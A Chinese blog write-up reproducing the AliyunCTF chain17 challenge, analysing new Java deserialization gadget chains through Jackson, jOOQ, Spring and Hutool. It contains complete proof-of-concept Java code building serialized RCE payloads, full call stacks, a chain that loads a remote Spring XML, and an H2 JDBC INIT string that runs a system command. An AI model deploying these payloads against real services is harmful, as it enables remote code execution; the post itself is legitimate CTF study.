title: 第二届 AliyunCTF chain17复现
author: Bmth
tags:
  - AliyunCTF
categories:
  - CTF
top_img: 'https://img-blog.csdnimg.cn/direct/916fe81944f3446f9669791763c187cf.png'
cover: 'https://img-blog.csdnimg.cn/direct/916fe81944f3446f9669791763c187cf.png'
date: 2024-03-31 02:25:00
---
![](https://img-blog.csdnimg.cn/direct/916fe81944f3446f9669791763c187cf.png)

他时若遂凌云志，敢笑黄巢不丈夫！

学到了，学废了，Orz

## 原生反序列化
先来看看 toString 的新链

### javax.swing.event.EventListenerList#readObject
![](https://img-blog.csdnimg.cn/direct/1841bba28f174eb998fe81035e69a63b.png)

调用add方法
![](https://img-blog.csdnimg.cn/direct/297ef2239e4643f88f33e4c46de9837b.png)

Automatic Call of toString()：
初次看的时候，发现并没有`toString`的调用啊，疑惑？其实巧妙的是，在 Object 进行拼接的时候会自动触发该对象的toString方法（很基础的点，但很容易遗漏）

接下来看看是否可控，很明显是`EventListener l = (EventListener)s.readObject();`
```java
// Serialization support.
private void writeObject(ObjectOutputStream s) throws IOException {
    Object[] lList = listenerList;
    s.defaultWriteObject();

    // Save the non-null event listeners:
    for (int i = 0; i < lList.length; i+=2) {
        Class<?> t = (Class)lList[i];
        EventListener l = (EventListener)lList[i+1];
        if ((l!=null) && (l instanceof Serializable)) {
            s.writeObject(t.getName());
            s.writeObject(l);
        }
    }

    s.writeObject(null);
}
```
需要找到能够强制转换为 EventListener 类型的类，并且实现 Serializable 接口

然后存放到 listenerList 属性中

### javax.swing.undo.UndoManager#toString
该类实现了 UndoableEditListener 接口
![](https://img-blog.csdnimg.cn/direct/21be756b87f94106a3df342ef9d2cec3.png)

而该接口继承了`java.util.EventListener`
![](https://img-blog.csdnimg.cn/direct/a8e8218517b34035a4f3d832c3607b87.png)

看到这个类的 toString 方法
![](https://img-blog.csdnimg.cn/direct/2b197b2f793b4d24910fed3aca9cf572.png)

limit 与 indexOfNextAdd 都是int类型，那么就跟进到父类
`javax.swing.undo.CompoundEdit#toString`
![](https://img-blog.csdnimg.cn/direct/80cceedc94be4c68b4dc5a7b10e637c7.png)

发现`protected Vector<UndoableEdit> edits;`，其余均是boolean类型，那么只能把希望寄托在 Vector 类了

### java.util.Vector#toString
![](https://img-blog.csdnimg.cn/direct/12273949b6344f4697ef659c1423e3be.png)

直接`super.toString();`，跟进`java.util.AbstractCollection#toString`
![](https://img-blog.csdnimg.cn/direct/27d2ab0d650347eb819beac6cfcf6f9e.png)

又是一个combo，即
```java
StringBuilder sb = new StringBuilder();
E e = it.next();
sb.append(e == this ? "(this Collection)" : e);
```
这里会调用到`java.lang.StringBuilder#append`
![](https://img-blog.csdnimg.cn/direct/c96befdc91114f7288dd2c9ab2b993b1.png)

`java.lang.String#valueOf`
![](https://img-blog.csdnimg.cn/direct/e5272b9dfabc4de988d3e7d31330aedf.png)

非常巧妙的一条链

给出JDK1.8的 jackson 利用链，POC：
```java
import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.springframework.aop.framework.AdvisedSupport;

import javax.swing.event.EventListenerList;
import javax.swing.undo.UndoManager;
import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Base64;
import java.util.Vector;

public class jackson_EventListenerList {
    static {
        try {
            // javassist 修改 BaseJsonNode
            ClassPool classPool = ClassPool.getDefault();
            CtClass ctClass = classPool.getCtClass("com.fasterxml.jackson.databind.node.BaseJsonNode");
            CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
            writeReplace.setBody("return $0;");
            ctClass.writeFile();
            ctClass.toClass();
        } catch (Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] args) throws Exception{
        byte[] bytes = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();

        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][]{bytes,ClassFiles.classAsBytes(jackson_BadAttributeValueExpException.Foo.class)});
        setFieldValue(templatesImpl, "_name", "a");
        setFieldValue(templatesImpl, "_tfactory", null);
        setFieldValue(templatesImpl, "_transletIndex", 0);

        //使用 Spring AOP 中的 JdkDynamicAopProxy,确保只触发 getOutputProperties
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(templatesImpl);
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);

        POJONode pojoNode = new POJONode(proxy);

        EventListenerList eventListenerList = new EventListenerList();
        UndoManager undoManager = new UndoManager();
        Vector vector = (Vector) getFieldValue(undoManager, "edits");
        vector.add(pojoNode);
        setFieldValue(eventListenerList, "listenerList", new Object[]{InternalError.class, undoManager});

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(eventListenerList);
        oos.close();
        System.out.println(new String(Base64.getEncoder().encode(baos.toByteArray())));
        System.out.println(new String(Base64.getEncoder().encode(baos.toByteArray())).length());

        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }
    public static void setFieldValue ( final Object obj, final String fieldName, final Object value ) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }
    public static Field getField ( final Class<?> clazz, final String fieldName ) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if ( field != null )
                field.setAccessible(true);
            else if ( clazz.getSuperclass() != null )
                field = getField(clazz.getSuperclass(), fieldName);

            return field;
        }
        catch ( NoSuchFieldException e ) {
            if ( !clazz.getSuperclass().equals(Object.class) ) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }
    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }
}
```
调用栈：
```
getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
invokeJoinpointUsingReflection:344, AopUtils (org.springframework.aop.support)
invoke:208, JdkDynamicAopProxy (org.springframework.aop.framework)
getOutputProperties:-1, $Proxy0 (com.sun.proxy)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
serializeAsField:689, BeanPropertyWriter (com.fasterxml.jackson.databind.ser)
serializeFields:774, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std)
serialize:178, BeanSerializer (com.fasterxml.jackson.databind.ser)
defaultSerializeValue:1142, SerializerProvider (com.fasterxml.jackson.databind)
serialize:115, POJONode (com.fasterxml.jackson.databind.node)
serialize:39, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)
serialize:20, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)
_serialize:480, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)
serializeValue:319, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)
serialize:1518, ObjectWriter$Prefetch (com.fasterxml.jackson.databind)
_writeValueAndClose:1219, ObjectWriter (com.fasterxml.jackson.databind)
writeValueAsString:1086, ObjectWriter (com.fasterxml.jackson.databind)
nodeToString:30, InternalNodeMapper (com.fasterxml.jackson.databind.node)
toString:59, BaseJsonNode (com.fasterxml.jackson.databind.node)
valueOf:2994, String (java.lang)
append:131, StringBuilder (java.lang)
toString:462, AbstractCollection (java.util)
toString:1003, Vector (java.util)
valueOf:2994, String (java.lang)
append:131, StringBuilder (java.lang)
toString:258, CompoundEdit (javax.swing.undo)
toString:621, UndoManager (javax.swing.undo)
valueOf:2994, String (java.lang)
append:131, StringBuilder (java.lang)
add:187, EventListenerList (javax.swing.event)
readObject:277, EventListenerList (javax.swing.event)
```
## server
由于环境是JDK17的，那么TemplatesImpl就无法利用了，需要找一条新的getter利用链
看到给出了依赖：
```xml
<dependency>
    <groupId>org.jooq</groupId>
    <artifactId>jooq</artifactId>
    <version>3.19.3</version>
</dependency>
```
直接给出结论：
```
EventListenerList.readObject -> POJONode.toString -> ConvertedVal.getValue -> ClassPathXmlApplicationContext.<init>
```

`org.jooq.impl.ConvertedVal#getValue`
![](https://img-blog.csdnimg.cn/direct/afef35141f4e44fcbee79527df9548fc.png)

调用`this.getDataType()`的 convert 方法，参数为`this.delegate.getValue()`

`org.jooq.impl.AbstractTypedNamed#getDataType`
![](https://img-blog.csdnimg.cn/direct/16133dc53ca2486c978aaf634bc9ffb6.png)

这个type需要为 DataType 类型、delegate需要为 AbstractParamX 类型
```java
final AbstractParamX<?> delegate;

ConvertedVal(AbstractParamX<?> delegate, DataType<T> type) {
    super(delegate.getUnqualifiedName(), type);
    AbstractParamX var10001;
    if (delegate instanceof ConvertedVal<?> c) {
        var10001 = c.delegate;
    } else {
        var10001 = delegate;
    }

    this.delegate = var10001;
}
```
通过构造方法即可赋值
### org.jooq.impl.Val
this.delegate 使用的是`org.jooq.impl.Val`，该类继承了 AbstractParam
![](https://img-blog.csdnimg.cn/direct/cd04b8cff5fb47a3ac3894ede5901324.png)

看到`org.jooq.impl.AbstractParam#getValue`
![](https://img-blog.csdnimg.cn/direct/1f2099819659468cb160375af566bf95.png)

即，参数为value值

### org.jooq.impl.TableDataType
this.type则使用的`org.jooq.impl.TableDataType`，该类继承了DefaultDataType
![](https://img-blog.csdnimg.cn/direct/a4025ebb16034408b04e5c752c4f0e4a.png)

最终会调用到父类`org.jooq.impl.AbstractDataType`的 convert 方法
![](https://img-blog.csdnimg.cn/direct/d1279531826c40348b49d538448aa30a.png)

执行`Convert.convert(object, this.getType())`
![](https://img-blog.csdnimg.cn/direct/39163bf5994d44f38493c151a421ae23.png)

这里`this.getType()`的值为`this.uType`，并且为Class类型

跟进`org.jooq.impl.Convert#convert`
![](https://img-blog.csdnimg.cn/direct/e2810b3c10364408915c229d12c46bbb.png)

跟进convert0方法
![](https://img-blog.csdnimg.cn/direct/2b89358386d244b1a1d9f68160bfda0a.png)

调用到`Convert$ConvertAll`的from方法，看到1084行
![](https://img-blog.csdnimg.cn/direct/693578b3c74f4ecba5edecd2417cb74a.png)

循环遍历`this.toClass`的构造方法，直到找到只有一个参数并且该参数的类型不与类本身相同，最后实例化该类

很明显能想到：
```
org.springframework.context.support.ClassPathXmlApplicationContext
org.springframework.context.support.FileSystemXmlApplicationContext
```
两个经典的实例化RCE

官方poc：
```java
import cn.hutool.core.util.ReflectUtil;
import cn.hutool.core.util.SerializeUtil;
import com.fasterxml.jackson.databind.node.POJONode;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.jooq.DataType;
import org.springframework.context.support.ClassPathXmlApplicationContext;
import org.springframework.context.support.FileSystemXmlApplicationContext;

import javax.swing.event.EventListenerList;
import javax.swing.undo.UndoManager;
import java.lang.reflect.Constructor;
import java.util.Base64;
import java.util.Vector;

// JDK17 VM options:
// --add-opens java.base/java.lang=ALL-UNNAMED --add-opens java.base/java.util.concurrent.atomic=ALL-UNNAMED --add-opens java.base/java.lang.reflect=ALL-UNNAMED --add-opens java.desktop/javax.swing.undo=ALL-UNNAMED --add-opens java.desktop/javax.swing.event=ALL-UNNAMED
public class jackson_EventListenerList_ConvertedVal {
    public static void main(String[] args) throws Exception {
        gen("http://localhost:8000/poc.xml");
    }

    public static void gen(String url) throws Exception{
        Class clazz1 = Class.forName("org.jooq.impl.Dual");
        Constructor constructor1 = clazz1.getDeclaredConstructors()[0];
        constructor1.setAccessible(true);
        Object table = constructor1.newInstance();

        Class clazz2 = Class.forName("org.jooq.impl.TableDataType");
        Constructor constructor2 = clazz2.getDeclaredConstructors()[0];
        constructor2.setAccessible(true);
        Object tableDataType = constructor2.newInstance(table);

        Class clazz3 = Class.forName("org.jooq.impl.Val");
        Constructor constructor3 = clazz3.getDeclaredConstructor(Object.class, DataType.class, boolean.class);
        constructor3.setAccessible(true);
        Object val = constructor3.newInstance("whatever", tableDataType, false);

        Class clazz4 = Class.forName("org.jooq.impl.ConvertedVal");
        Constructor constructor4 = clazz4.getDeclaredConstructors()[0];
        constructor4.setAccessible(true);
        Object convertedVal = constructor4.newInstance(val, tableDataType);

        Object value = url;
        Class type = ClassPathXmlApplicationContext.class;

        ReflectUtil.setFieldValue(val, "value", value);
        ReflectUtil.setFieldValue(tableDataType, "uType", type);

        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod ctMethod = ctClass.getDeclaredMethod("writeReplace");
        ctClass.removeMethod(ctMethod);
        ctClass.toClass();

        POJONode pojoNode = new POJONode(convertedVal);

        EventListenerList eventListenerList = new EventListenerList();
        UndoManager undoManager = new UndoManager();
        Vector vector = (Vector) ReflectUtil.getFieldValue(undoManager, "edits");
        vector.add(pojoNode);
        ReflectUtil.setFieldValue(eventListenerList, "listenerList", new Object[]{InternalError.class, undoManager});

        byte[] data = SerializeUtil.serialize(eventListenerList);
        System.out.println(Base64.getEncoder().encodeToString(data));

        SerializeUtil.deserialize(data);

    }

}
```
调用栈：
```
<init>:85, ClassPathXmlApplicationContext (org.springframework.context.support)
newInstance0:-1, NativeConstructorAccessorImpl (jdk.internal.reflect)
newInstance:77, NativeConstructorAccessorImpl (jdk.internal.reflect)
newInstance:45, DelegatingConstructorAccessorImpl (jdk.internal.reflect)
newInstanceWithCaller:499, Constructor (java.lang.reflect)
newInstance:480, Constructor (java.lang.reflect)
from:1401, Convert$ConvertAll (org.jooq.impl)
convert0:443, Convert (org.jooq.impl)
convert:518, Convert (org.jooq.impl)
convert:771, AbstractDataType (org.jooq.impl)
convert:139, DefaultDataType (org.jooq.impl)
getValue:90, ConvertedVal (org.jooq.impl)
invoke0:-1, NativeMethodAccessorImpl (jdk.internal.reflect)
invoke:77, NativeMethodAccessorImpl (jdk.internal.reflect)
invoke:43, DelegatingMethodAccessorImpl (jdk.internal.reflect)
invoke:568, Method (java.lang.reflect)
serializeAsField:688, BeanPropertyWriter (com.fasterxml.jackson.databind.ser)
serializeFields:772, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std)
serialize:178, BeanSerializer (com.fasterxml.jackson.databind.ser)
defaultSerializeValue:1150, SerializerProvider (com.fasterxml.jackson.databind)
serialize:115, POJONode (com.fasterxml.jackson.databind.node)
_serializeNonRecursive:105, InternalNodeMapper$WrapperForSerializer (com.fasterxml.jackson.databind.node)
serialize:85, InternalNodeMapper$WrapperForSerializer (com.fasterxml.jackson.databind.node)
serialize:39, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)
serialize:20, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)
_serialize:479, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)
serializeValue:318, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)
serialize:1572, ObjectWriter$Prefetch (com.fasterxml.jackson.databind)
_writeValueAndClose:1273, ObjectWriter (com.fasterxml.jackson.databind)
writeValueAsString:1140, ObjectWriter (com.fasterxml.jackson.databind)
nodeToString:34, InternalNodeMapper (com.fasterxml.jackson.databind.node)
toString:242, BaseJsonNode (com.fasterxml.jackson.databind.node)
valueOf:4222, String (java.lang)
append:173, StringBuilder (java.lang)
toString:457, AbstractCollection (java.util)
toString:1083, Vector (java.util)
stringOf:453, StringConcatHelper (java.lang)
invokeStatic:-1, DirectMethodHandle$Holder (java.lang.invoke)
invoke:-1, LambdaForm$MH/0x000001b1dd191400 (java.lang.invoke)
linkToTargetMethod:-1, LambdaForm$MH/0x000001b1dd191c00 (java.lang.invoke)
toString:266, CompoundEdit (javax.swing.undo)
toString:695, UndoManager (javax.swing.undo)
stringOf:453, StringConcatHelper (java.lang)
invokeStatic:-1, DirectMethodHandle$Holder (java.lang.invoke)
invoke:-1, LambdaForm$MH/0x000001b1dd00e000 (java.lang.invoke)
linkToTargetMethod:-1, Invokers$Holder (java.lang.invoke)
add:213, EventListenerList (javax.swing.event)
readObject:309, EventListenerList (javax.swing.event)
```

## agent
给出了依赖：
```xml
<dependency>
    <groupId>cn.hutool</groupId>
    <artifactId>hutool-all</artifactId>
    <version>5.8.16</version>
</dependency>

<dependency>
    <groupId>com.h2database</groupId>
    <artifactId>h2</artifactId>
    <version>2.2.224</version>
</dependency>
```
一个是H2-数据库，另一个是Hutool-Java工具包类库

Hutool的利用在2023 国赛初赛中出现过：[2023 CISCN 初赛 Web Writeup - X1r0z Blog](https://exp10it.io/2023/05/2023-ciscn-%E5%88%9D%E8%B5%9B-web-writeup/#deserbug)
>hutool 会在 add/put 的时候触发任意 getter/setter

利用链：
```
JSONObject.put -> AtomicReference.toString -> POJONode.toString -> Bean.getObject -> DSFactory.getDataSource -> Driver.connect
```

看到`cn.hutool.db.ds.DSFactory#getDataSource`
![](https://img-blog.csdnimg.cn/direct/20a7d7d12636444d9818e6149efcda3d.png)

跟进到子类`cn.hutool.db.ds.AbstractDSFactory#getDataSource`
![](https://img-blog.csdnimg.cn/direct/dae211339f484c848b98abbd6cc9b4e5.png)

创建DataSource对象
![](https://img-blog.csdnimg.cn/direct/166b28e119214939bd74092dbcee7c4b.png)

首先确保`Setting config`不为空，并且存在key url

通过url来自动加载相应的Driver类，看到 createDataSource 的实现类
![](https://img-blog.csdnimg.cn/direct/eb65cdf1d7ac444fb12536248237163a.png)

根据依赖等限制，最终可选择的类如下：
- JndiDSFactory
- PooledDSFactory

### JNDI
`cn.hutool.db.ds.jndi.JndiDSFactory`
![](https://img-blog.csdnimg.cn/direct/f84317bc661b48cb8ba4f7101b30bc7b.png)

从Setting中获取jndi，然后调用`cn.hutool.db.DbUtil#getJndiDs`
![](https://img-blog.csdnimg.cn/direct/5e3570aaf1114e54b37c8655017e6f21.png)

很显然的JNDI注入

可惜的是暂时无法绕过JDK高版本限制，forceString 在 Tomcat 较新的版本中已经修复
![](https://img-blog.csdnimg.cn/direct/de671e63aba140fc993d29804a5f8230.png)

报错：
>The forceString option has been removed as a security hardening measure. Instead, if the setter method doesn't use String, a primitive or a primitive wrapper, the factory will look for a method with the same name as the setter that accepts a String and use that if found.


### H2 JDBC RCE
`cn.hutool.db.ds.pooled.PooledDSFactory`
![](https://img-blog.csdnimg.cn/direct/b2c9893fc7114a6984a27c8013a9596a.png)

获取参数并放到 dbConfig，然后实例化`cn.hutool.db.ds.pooled.PooledDataSource`
![](https://img-blog.csdnimg.cn/direct/9eded67a52c54d99b2dfb3668c0b7f71.png)

跟进 newConnection 方法
![](https://img-blog.csdnimg.cn/direct/bd06fa91f2384f5da4e59a0b3a7f70f5.png)

实例化`cn.hutool.db.ds.pooled.PooledConnection`
![](https://img-blog.csdnimg.cn/direct/9958aef300c84bf5a4cc004f86c18735.png)

`DriverManager.getConnection`创建数据库连接，同时存在H2依赖

虽然在JDK15以后移除了javascript，但是还是能用 RUNSCRIPT 加载远程sql文件

[Java安全攻防之老版本Fastjson的一些不出网利用](https://mp.weixin.qq.com/s/5zr2qWMd9GFMu37P89qjxA)

>为什么需要RUNSCRIPT?  按照网上的说法是：
1、H2 RCE分为两个步骤，需要先创建代码执行方法，再通过EXEC执行该方法
2、H2 init所使用的session.prepareCommand不支持执行多条SQL语句

其实并不需要 RUNSCRIPT 出网加载，prepareCommand本身是支持多条SQL语句执行：（仅需要将分号转义即可）
```sql
jdbc:h2:mem:test;MODE=MSSQLServer;INIT=CREATE ALIAS if not exists EXEC AS 'void exec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\;}'\;CALL EXEC ('calc')\;
```

参考：
[AliYunCTF By W&M x V&N](https://blog.wm-team.cn/index.php/archives/74/)
[第二届AliyunCTF官方writeup](https://xz.aliyun.com/t/14190)